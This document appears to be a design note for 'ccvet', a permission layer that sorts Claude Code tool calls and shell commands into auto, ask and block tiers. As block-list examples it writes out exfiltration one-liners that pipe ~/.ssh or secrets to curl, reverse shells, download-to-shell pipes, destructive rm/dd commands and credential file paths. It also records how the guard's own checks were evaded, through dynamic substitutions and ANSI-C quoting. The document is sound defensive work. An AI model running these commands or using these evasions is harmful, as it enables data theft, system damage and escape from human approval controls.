# ccvet Layer 0/1 Risk Taxonomy

Goal: classify as much real-world traffic as possible with zero model calls. Layer 2 (LLM) should only ever see the leftover gray zone. Every row here ships in the default `policy.yaml` as a starting point users can edit.

Four verdicts:
- **AUTO**: auto-approve, no prompt, no log noise beyond a one-line audit entry.
- **ASK**: mutating but reversible, local-scope; surfaced to the user with a one-line reason.
- **BLOCK**: irreversible, system-wide, network-exfil-shaped, or credential-touching. No LLM verdict can override this tier; it's the safety floor.
- **GRAY**: doesn't match any rule; falls through to Layer 2 if configured, otherwise defaults to ASK.

## Filesystem and inspection
| Verdict | Examples |
|---|---|
| AUTO | `ls`, `pwd`, `cat`, `less`, `head`, `tail`, `grep`/`rg`/`ag` (no `-exec`), `find` (no `-delete`/`-exec`/`-execdir`/`-ok`/`-okdir`), `file`, `stat`, `wc`, `diff`, `tree`, `du`, `df`, `which`, `type`, plus plain text-transform/checksum/system-inspection utilities (`cut`, `tr`, `nl`, `fold`, `fmt`, `column`, `pr`, `comm`, `paste`, `md5sum`/`sha1sum`/`sha256sum`/`shasum`/`cksum`, `nproc`, `arch`, `locale`, `free`, `vm_stat`, `lscpu`, `lsblk` (not `--fstrim`, which discards unused blocks on the listed devices - a real device effect, not a pure read), `sw_vers`), `hostname` (no arguments only) |
| ASK | `mkdir`, `touch`, `cp`/`mv` within project, `chmod` (non-777, within project), `ln -s`, `env`/`printenv` (could print secrets, so ask, not auto), `hostname <name>` (sets the hostname), `sort`/`uniq` (both can write a file directly as an argument - `sort -o FILE`, `uniq in out` - bypassing redirect checking entirely, so treated as ask rather than a blanket auto the way `cut`/`tr` are) |
| BLOCK | `rm -rf /`, `/var`, `/opt`, `/Applications`, `/Library`, `/root`, and the other top-level system directories; `rm -rf ~`, a literal `/Users/<name>` or `/home/<name>` home-directory root, or a bare `*`/`.*` wildcard; `chmod -R 777 /` (octal) or `chmod -R a+rwx /` (symbolic, same effect), **including the same literal `/Users/<name>`/`/home/<name>` home-directory root `rm` catches**; `chown -R` on system paths; `dd if=... of=/dev/sdX`; `mkfs.*`; `diskutil eraseDisk` |

The literal-home-directory-root heuristic (`/Users/charan` is just as catastrophic as `~` or `/`, but isn't knowable as a fixed string in advance) was added for `rm` first and, for a while, never carried over to `chmod`: `rm -rf /Users/charan` denied while `chmod -R 777 /Users/charan` only asked, found by a later testing pass. Both now share the same underlying check, parameterized by each command's own target-name set (`chmod`'s deliberately omits `rm`'s bare-wildcard entries like `*`/`/*`/`.*`, which are specific to a recursive delete, not a permission change).

**A generic rule, not a growing per-program list**: any program invoked with *exactly* `--version`/`--help` and nothing else auto-allows, regardless of which program it is - `node --version`, `rustc --version`, and anything else, present or future, without needing to name each one. Deliberately requires the flag to be the *entire* argument list (a version/help flag alongside a real operand, like `curl --help https://example.com`, still asks like any other invocation of that program) and is checked only as a last resort, after every hard-coded guard and after both `auto_programs`/`ask_programs` list membership - so `sudo --version` still denies via `sudo`'s own unconditional guard, and a program already on `ask_programs` (`chmod --version`, `curl --version`) still asks rather than being swept into this, a deliberately conservative choice rather than a gap. Short forms (`-v`/`-V`/`-h`) are deliberately **not** included, found to be a real regression by a later review: `bash`/`sh`/`zsh`'s `-v` is verbose *execution* mode, not version (confirmed by execution: `echo 'echo PWNED' | bash -v` actually runs the piped command, since with no script argument the shell still reads and executes from stdin), and `-h` is a per-shell option letter, not help. Only the long forms are a near-universal, unambiguous GNU-style convention with no competing letter-flag meaning.

## Git
| Verdict | Examples |
|---|---|
| AUTO | `git status`, `git diff`, `git log`, `git show`, `git blame`, `git branch` with only listing flags (`-a`/`-r`/`-v`/`-vv`/`--list`/`--all`/`--remotes`/`--show-current`/`--color`/`--no-color` - an explicit allowlist, not "no operand": see below), `git remote -v`/`show` (not add/remove/set-url), `git stash list`/`show`, `git fetch`, `git describe`, `git tag -l`/`git tag <name>` (list or create, not `-d`/`--delete`), `git --version`, plus read-only plumbing with no mutating form at all: `git rev-parse`, `git show-ref`, `git shortlog`, `git ls-files` (including `--resolve-undo`, a pure display of index metadata, not a deletion), `git cat-file`, and `git worktree list`/`git config -l`/`--get` (their own mutating forms - `worktree add`/`remove`, `config <key> <value>` - ask) |
| ASK | `git add`, `git commit`, `git checkout -b`, `git merge` (non-force), `git pull`, `git rebase` (local, unpushed), `git stash pop`, `git remote add`/`remove`/`rm`/`set-url`/`rename`/`prune` (can redirect future pushes to an attacker-controlled remote), `git tag -d`/`--delete`, `git branch <name>`/`-m <old> <new>` (creating/renaming), `git branch --unset-upstream`/`--edit-description` (zero-operand flags that still mutate - removes upstream tracking, spawns an editor - deliberately not inferred as safe just because nothing after them looks like a branch name), `git worktree add`/`remove`/`prune`, `git config <key> <value>`/`--unset`, `git ls-remote` (a real network call to a remote the user may not control, unlike the purely-local plumbing above) |
| BLOCK | `git push --force`/`--force-with-lease` to `main`/`master`/protected branches, `git reset --hard`, `git clean -fdx`, `git branch -D` on protected branches, `git push origin --delete <protected>`, `git filter-branch`/`filter-repo` |

`git remote` and `git tag` were originally treated as blanket read-only, with no check on their mutating sub-forms (`remote add/remove/set-url`, `tag -d`). Flagged by an external review and fixed: these two now have the same flag-sensitive handling as `push`/`reset`/`clean`/`branch` always did. `branch`/`worktree`/`config`/the five plumbing subcommands above were added later, found by a deep search for common read-only commands not yet covered - each needed the identical list-form-only split (or, for the plumbing five, no split at all, since none of them have a mutating form).

## Package managers and dependencies
| Verdict | Examples |
|---|---|
| AUTO | `npm list`, `npm view`, `npm --version`, `npm audit` (not `audit fix`, which installs changes), `pip show`, `pip list`, `pip --version`, `go list`, `go env` (not `go env -w`, which persists a change to GOENV), `go doc`, `go vet`, `brew list`, `brew info`, `brew outdated`, `brew doctor` |
| ASK | `npm install`/`pip install` (new deps), `npm uninstall`, `npm audit fix` (npm's own docs describe it as automatically installing changes - checking only `args[0] == "audit"` would have missed this, found by external review), `cargo add`, `go get`, `go env -w ...` (persists the change, unlike a bare `go env`), `go build`/`run`/`install`/`mod tidy` (compiles or runs code, not purely read-only like `go list`/`env`/`vet`), `brew install`/`upgrade`/`uninstall` |
| BLOCK | `npm publish`, `twine upload`/`pip upload`, `curl <url> \| sh`/`bash`, `wget -O- <url> \| sh`, anything piping a download straight into a shell |

`go`/`brew` used to be blanket `ask_programs` entries, asking about every invocation including their read-only subcommands the same way `npm`/`pip` would have without their own dedicated classifier - found by the same deep search as the git additions above. `cargo` is deliberately left as a blanket ask rather than given the same subcommand-aware split: `cargo check` runs `build.rs` scripts and macro expansion, which are a real code-execution vector (unlike `go vet`'s pure static analysis), so it doesn't belong in the same "obviously read-only" bucket without more care than this round gave it.

## Build, test, and lint
| Verdict | Examples |
|---|---|
| AUTO | `tsc --noEmit`, `eslint` (no `--fix`), `pytest --collect-only`, `cargo check`, `go vet` |
| ASK | `npm run <script>` (opaque, so ask by default), `make`, `pytest` (real run, side effects possible), `eslint --fix`, `cargo build`/`run`, `docker build` |
| GRAY | Arbitrary `./script.sh` with unknown contents. No pattern to match; defer to Layer 2 or ASK. |

## Process and system
| Verdict | Examples |
|---|---|
| AUTO | `ps`, `top` (read), `uname`, `whoami`, `id`, `uptime` |
| ASK | `kill <pid>` (specific, non-critical), `killall <user-process>` |
| BLOCK | `sudo` anything, `kill -9 1`, broad `killall -9`/`pkill -f .`, `systemctl stop/disable` on core services, `launchctl unload` on system daemons, `crontab -r` |

## Network
| Verdict | Examples |
|---|---|
| ASK | plain `curl`/`wget` GET (no pipe to shell), `ping`, `dig`/`nslookup` |
| BLOCK | download piped to shell (see package managers), exfil-shaped commands (`tar czf - ~/.ssh \| curl -T - https://...`, `cat <secret> \| curl -d @- <host>`), reverse shells (`nc -e /bin/sh`, `bash -i >& /dev/tcp/...`) |

## Secrets and credentials
| Verdict | Examples |
|---|---|
| BLOCK (always, regardless of read vs write, including as a shell redirect target) | any path under `~/.ssh/id_*`, `~/.aws/credentials`, `~/.config/gcloud`, `/etc/passwd`, `/etc/shadow`, `.env` and its real-secret variants (`.env.local`, `.env.production`, `.env.development`, ...), `.netrc`, `.npmrc`, `.pypirc`, `.envrc`, `.git-credentials`, `.config/gh/hosts.yml`, `.docker/config.json`, `.aws/sso/cache/*`, as a plain argument, as input to a command (`cat secret \| cmd`), or as a redirect target (`cmd < ~/.aws/credentials`, `cmd >> ~/.ssh/authorized_keys`) |
| BLOCK, overridable | anything matching `*token*`/`*secret*`/`*credential*` **combined with** a network call in the same command. Fuzzy name-based matching can false-positive on two unrelated sub-commands sharing one compound statement, so unlike the exact-path match above, this one can be promoted past with `ccvet allow` once reviewed. |

Path matching (both here and for Edit/Write tool calls) is component-aware, not a raw substring search on the resolved path: `/etc/passwd` matches an actual file named `passwd` inside an `etc` directory, not `/etc/passwd_notes.md`. Redirect targets (`>`, `>>`, `<`, `<<<`) are checked the same way as Edit/Write paths, since a secret or persistence path used only as a redirect target never appears in a command's argument list at all.

A *static*, *output*-direction redirect target (`>`/`>>`, never `<`/`<<<`) is also resolved against the project-root boundary, the same way `Write`/`Edit` already are in `fsrules.py` - found by external review: `> /etc/hosts`, or any command redirecting outside the project root, classified as a plain allow (even `> /etc/hosts` alone, with no command word before the redirect at all - the empty argv it extracts to is correctly a no-op in `classify_argv`'s eyes, but the redirect itself still truncates the target). The exact same path via `Write` already denied; the Bash redirect form of the identical write didn't. A dynamic redirect target (one containing a substitution or variable) is unaffected - that shape is already handled, more strictly, by the secret/persistence check above.

`.env`/`.netrc`/`.npmrc`/`.pypirc`/`.envrc` were missing from this list entirely until an external review flagged it: `.env` in particular is arguably the single most common real-world location for secrets in an actual project, more so than several entries that were already covered. A follow-up review then caught that the Bash-argument version of this check was a raw substring match rather than component-aware like the Edit/Write path check: `cat .env.example`/`.env.local`/`.env.sample` (common, safe conventions for documenting required variables, not real secrets) were denied. Both now use the same component-aware matcher.

That component-exact fix went one step too far the other way: a plain `.env` pattern component only matches the literal `.env`, so `.env.local`/`.env.production` (the conventional real-secret-bearing variants, e.g. Next.js's env-file loading order) read through as `allow`, a third-round external review finding. `.env` handling is now its own dedicated check, not a plain pattern-list entry: a filename of `.env` or `.env.<anything>` is dangerous *unless* it ends in one of a short list of known-safe documentation suffixes (`.example`, `.sample`, `.template`, `.dist`, `.defaults`). Shared by the Bash-argument, redirect-target, and Edit/Write/Read paths alike.

A later testing pass found the same gap `.env` was in originally, for four other credential stores: `.git-credentials` (git's own credential helper writes plaintext `user:token@host` lines here), `.config/gh/hosts.yml` (the GitHub CLI's OAuth token), `.docker/config.json` (base64-encoded registry auth, same tier as `.npmrc`/`.pypirc`), and `.aws/sso/cache/*` (cached AWS SSO bearer tokens, matched at the directory level since every file in it is a cached credential by construction). Deliberately **not** added: `.gitconfig`. Unlike those four, which are exclusively credential stores by design with nothing else legitimately living there, `.gitconfig` is an ordinary config file (`user.name`, `[alias]` entries, `core.*` settings) that only atypically embeds a credential, e.g. a rewritten remote URL under `[url "..."]`. Treating it as a hard deny would be the same mistake the original `.env` pattern made before the `.env.example` carve-out, just in the other direction - this is the same judgment call as `.env` vs `.env.example`, applied to a file instead of a filename suffix.

**Dynamic arguments.** A command's own name being dynamically constructed (`$(echo rm) -rf /`) was already denied outright, but an *argument* being dynamically constructed was not checked at all: `cat $(ls -d ~/.ssh)/id_rsa` has a perfectly ordinary, recognized command name ("cat"), and the raw argument text `$(ls -d ~/.ssh)/id_rsa` doesn't contain `.ssh/id_` as a contiguous substring (the closing paren breaks it), so this classified straight to `allow`. Also found by external review. Fixed: any extracted command whose argument contains a substitution or variable expansion that isn't *purely* a self-contained command/process substitution (i.e. not just `<(ls -la)` as the whole argument, where the inner command is independently classified anyway) now caps the result at `ask` instead of `allow`, regardless of which program is being called.

**Dynamic redirect targets.** A second round of external review found the same bypass shape one level deeper: `cat myfile > $(echo ~/.bashrc)` has a redirect target that was extracted as the raw, unexpanded text `$(echo ~/.bashrc)`, matching no literal pattern, with no dynamic-content check applied to redirect targets at all (only argv words had one). Fixed at the time by denying *any* redirect target containing a substitution or variable expansion outright, with no override, since there's no equivalent way to verify what a redirect *target* resolves to the way classifying `<(ls -la)` verifies a data *source*. Tilde expansion is still excluded (predictable, not a substitution).

A third round of review pushed back on that specific choice: `cat x > $(mktemp)` is a perfectly ordinary, common temp-file idiom, and making it a hard deny with no `ccvet allow` escape hatch is asymmetric with a dynamic *argument* (above), which asks and stays overridable. Severity for a redirect target is now three-way rather than a boolean: a *pure* substitution, the whole target is one self-contained `$(...)`/`<(...)`/`>(...)`, nothing concatenated around it, downgrades to an overridable `ask` instead of a hard `deny`. This applies uniformly by structure, not by inspecting what the inner command's own argument happens to look like: `$(echo ~/.bashrc)` and `$(mktemp)` are both "pure" and both ask, even though the former's inner command literally references a sensitive-looking name, because the redirect target's final resolved value still can't be verified without running the substitution either way. Anything less clean, literal text glued around a substitution (`$(ls -d ~/.ssh)/id_rsa`), stays a hard, non-overridable deny.

A follow-up observation after that fix landed: a bare variable (`cmd > $OUT`) was still hitting the hard-deny branch, even though `OUT=report.txt; cmd > $OUT` is just as ordinary and just as unverifiable as `$(mktemp)`, no more obfuscation-shaped than it. The "pure, nothing concatenated" check (bashlex position-span equality between the whole word and its one dynamic child) now applies to a bare variable the same way it applies to a substitution, so `$OUT` asks like `$(mktemp)` does; `${OUT}.bak`-style concatenation still denies, same as `$(ls -d ~/.ssh)/id_rsa`.

That same fix surfaced a second-order consequence worth naming explicitly: once overridable guard-level verdicts started reaching the override pipeline (the architectural fix in the "Shell redirections" section's history), the optional Layer 2 LLM classifier could, for the first time, act on an overridable *deny* (the generic token/secret/credential-name heuristic), not just an overridable *ask* - `classifier.classify()` itself has no opinion on the input decision, it only ever sees what `shellrules.evaluate()` hands it. Deliberately kept Layer 2 restricted to the `ask` tier only, matching its own long-documented contract ("can only turn an ask into an allow, never a deny"); a human-reviewed `ccvet allow` policy rule is a different trust tier and still works on any overridable verdict, deny included.

## Database
| Verdict | Examples |
|---|---|
| ASK | `SELECT`, `INSERT`, `UPDATE ... WHERE` (scoped) |
| BLOCK | `DROP DATABASE`/`DROP TABLE`, `TRUNCATE`, `DELETE FROM <table>` with no `WHERE`, `UPDATE` with no `WHERE` |

The WHERE check is scoped to the specific DELETE/UPDATE statement (up to the next `;` or closing quote), not the whole command text, so an unrelated WHERE elsewhere in a multi-statement command (`psql -c "DELETE FROM users" -c "... WHERE ..."`) doesn't mask a genuinely unconditional delete.

## Cloud and infra CLIs
| Verdict | Examples |
|---|---|
| ASK | `aws s3 ls`, `aws s3 cp` (a few files), `kubectl get`, `kubectl apply`, `terraform plan` |
| BLOCK | `terraform destroy`, `aws s3 rm --recursive`, `kubectl delete namespace`/`--all`, `gcloud ... delete`, IAM key creation on root/admin accounts |

## Obfuscation heuristics (Layer 1, pattern-based, not just literal string match)
These exist because a determined bad actor (or a confused model) won't always spell the dangerous command literally:
- base64/hex decode piped to a shell (`echo <b64> | base64 -d | sh`)
- command reconstructed from `$(...)`/env-var concatenation right before execution
- **Rule**: any decode-then-pipe-to-shell shape gets BLOCK regardless of what's inside. Hiding the payload from static review is itself the risk signal, independent of content.

**Engineering note**: this tier only works if commands are tokenized with a real shell parser (`bashlex`/`shlex`), not matched as raw strings. Naive regex on the literal text misses `cmd1 && cmd2`, quoted/escaped variants, and command substitution. The matcher must split compound commands (`&&`, `;`, `|`, `$(...)`) into sub-commands, classify each independently, and take the **highest** risk tier found. A pipeline is only as safe as its most dangerous segment (e.g. `grep foo file | rm -rf bar` must not slip through because `grep` alone is AUTO).

## Beyond Bash: other Claude Code tool calls
The taxonomy above is shell-command-centric, but `PreToolUse` fires for every tool, not just Bash. These need their own rules:

| Tool | Verdict | Notes |
|---|---|---|
| `Read`, `Grep`, `Glob` | AUTO | Already read-only by construction, except reads from the secrets paths above, which stay BLOCK/ASK even for reads. Only a real path field (`file_path`/`path`/`notebook_path`) is checked against those secret paths; Grep/Glob's `pattern` field is a search term, not a path, and is never resolved or checked as one (found by external review: it used to be, so `Grep(pattern=".env.production")` - an ordinary search for that literal text - denied outright with no actual path involved at all). |
| `Edit`/`Write`/`NotebookEdit` on normal project files | ASK (default) | Path resolved to its real, symlink-free location first (see below). AUTO is reasonable to promote once trust is established, but not the v1 default. |
| `Edit`/`Write` on build/CI/package manifests | ASK, flagged distinctly | `package.json` (especially new `scripts`/`postinstall`/`preinstall` entries), `.npmrc`, `pyproject.toml` build-system, `Pipfile`, `.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`, `Dockerfile`. These can grant CI secrets access or inject code that runs on someone else's machine later, so they're a supply-chain vector, not just a local file edit. |
| `Edit`/`Write` on persistence/backdoor vectors | BLOCK | `.git/hooks/*`, `~/.bashrc`/`~/.zshrc`/`~/.profile`/`~/.bash_profile`, `crontab` edits, `~/Library/LaunchAgents/*.plist` (macOS), systemd user unit files, and Claude Code's own `.claude/settings.json`/`.claude/settings.local.json`/`~/.claude/settings.json`/`.mcp.json`/`.claude/commands/*`/`.claude/agents/*` (the files that define Claude Code's own permissions, hooks, and MCP servers, added after a third-round external review found them missing and able to be rewritten via Bash redirect even though the identical file via Edit/Write already asked or denied). Writing here configures *future* execution, which is the classic persistence pattern, so it's treated as BLOCK even though "just writing a file" looks harmless. |
| `Edit`/`Write` outside the project root | BLOCK (default), ASK if explicitly scoped by the user | Resolved via realpath before the scope check; `../../` traversal and symlinks must not bypass the project-root boundary. |
| `WebFetch`/`WebSearch` | ASK / AUTO | `WebSearch` (no page content fetched) can be AUTO. `WebFetch` of an arbitrary URL is ASK by default, since it's a network call that can also be a prompt-injection vector if the fetched page tries to steer the agent. |
| `Task`/`Agent` (spawning a subagent) | ASK | Kicks off autonomous work that may itself make further tool calls. Visibility matters here even if each individual sub-action would otherwise be AUTO. |
| Any other/unknown MCP tool | GRAY, defaults to ASK | No built-in opinion on a third-party MCP tool's risk. Defaults to ASK rather than AUTO for anything ccvet doesn't recognize; this is the generic fallback, separate from the Bash-specific GRAY case below. |

## Scope notes
- **POSIX shells only for v1.** The taxonomy above targets bash/zsh on macOS and Linux. Windows/PowerShell equivalents (`Remove-Item -Recurse -Force`, `Format-Volume`, `icacls`, `Start-Process -Verb RunAs`) are a deliberate non-goal for the first release, not an oversight. This is called out in the README rather than silently under-covered.
- **`case`, `select`, `coproc`, `[[ ... ]]` test expressions, and arithmetic `for ((...))` loops aren't parseable by bashlex at all.** This is a library limitation, not something fixable in ccvet's own code. Each one fails to parse and falls to `ask` ("could not parse as shell syntax"), not `allow`. Safe, just not actively classified; noted here rather than silently missing. All other compound constructs (brace groups `{ ...; }`, subshells `(...)`, `if`/`while`/`for`, process substitution `<(...)`/`>(...)`, and the transparent wrappers `eval`/`exec`/`command`/`builtin`) parse correctly and are fully classified as of the Phase 5 hardening fixes.
- **ANSI-C quoting (`$'...'`) around a flag argument can evade the exact-flag-string checks in the hard-coded guards.** For example, `rm $'-rf' /` downgrades from the expected `deny` to `ask`, because bashlex mis-parses `$'-rf'` as a parameter expansion rather than dequoting it to the literal string `-rf`, so the catastrophic-rm check's `arg.startswith("-")` test never matches. This is a bashlex parsing limitation, not an unlimited bypass: the result still fails toward `ask`, never silently toward `allow`. Normal single and double quotes (`'-rf'`, `"-rf"`) are dequoted correctly and are not affected.

## What stays GRAY on purpose
Anything that's a mutating action with no clean pattern match: a novel one-off shell one-liner, an unfamiliar CLI tool, a script whose contents weren't inspected. These are exactly what Layer 2 is for. Without Layer 2 configured, they fall back to ASK, never AUTO.
